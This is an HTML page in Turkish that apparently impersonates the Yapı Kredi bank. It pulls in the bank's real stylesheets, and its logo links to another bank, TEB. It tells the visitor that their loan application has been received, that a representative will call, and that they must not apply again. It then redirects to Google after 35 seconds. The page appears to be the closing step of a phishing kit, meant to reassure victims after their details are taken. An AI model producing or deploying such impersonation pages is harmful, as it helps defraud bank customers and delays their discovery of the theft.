<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yapı Kredi</title>
    <link rel="stylesheet" href="https://www.yapikredi.com.tr//ngi-static/css/source/fonts.css">
    <link rel="stylesheet" href="https://www.yapikredi.com.tr//ngi-static/css/main.ui.min.css">
    <link rel="stylesheet" href="main.css">
    <style>
        .responsive-image {
            width: 100%;
            max-width: 150px;
            height: auto;
            margin-bottom: 15px;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }
    </style>
    <script>
        // Sayfa yüklendikten 15 saniye sonra Google'a yönlendirme
        setTimeout(function() {
            window.location.href = "https://www.google.com";
        }, 35000); // 35,000 milisaniye = 35 saniye
    </script>
</head>
<body>
    <div class="container">
        <div class="logo">
            <a href="https://www.teb.com.tr/sizin-icin/internet-subesi" target="_blank">
                <img src="./logo.png" alt="Yapı Kredi Logo">
            </a>
        </div>
        
        <img src="onay.png" alt="Başvuru Onay" class="responsive-image">
        
        <div class="message"><strong>Başvurunuz Alındı</strong></div>
        <div class="note">Kredinizin Ön Onayı Alınması Halinde <br>Müşteri Temsilciniz Tarafından Onay için Aranacaksınız. <br>Bu Süre İçerisinde Tekrar Başvuru Yapmayınız.</div>
    </div>
</body>
</html>
